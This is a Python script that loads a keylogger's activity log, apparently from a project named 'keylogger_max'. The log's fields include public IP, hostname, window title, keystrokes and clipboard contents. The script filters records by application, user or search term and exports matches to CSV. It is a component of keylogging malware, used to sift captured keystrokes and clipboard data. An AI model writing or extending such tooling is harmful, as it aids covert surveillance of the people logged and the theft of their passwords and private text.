import pandas as pd
import argparse
import os

LOG_FILE = os.path.expanduser("~/projects/keylogger_max/activity.csv")

def load_log():
    return pd.read_csv(LOG_FILE, names=[
        "timestamp", "user", "public_ip", "hostname", "os",
        "pid", "exe_path", "window_title", "key", "clipboard"
    ], skiprows=1)

def filter_logs(app=None, user=None, search=None):
    df = load_log()
    if app:
        df = df[df["exe_path"].str.contains(app, case=False, na=False)]
    if user:
        df = df[df["user"].str.lower() == user.lower()]
    if search:
        df = df[df["key"].str.contains(search, case=False, na=False)]
    return df

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--app", help="Filter by executable path")
    parser.add_argument("--user", help="Filter by username")
    parser.add_argument("--search", help="Search for keys or clipboard content")
    parser.add_argument("--export", help="Export path (CSV)")
    args = parser.parse_args()

    df = filter_logs(args.app, args.user, args.search)

    if args.export:
        df.to_csv(args.export, index=False)
        print(f"[+] Exported {len(df)} records to {args.export}")
    else:
        print(df.head(30).to_string(index=False))

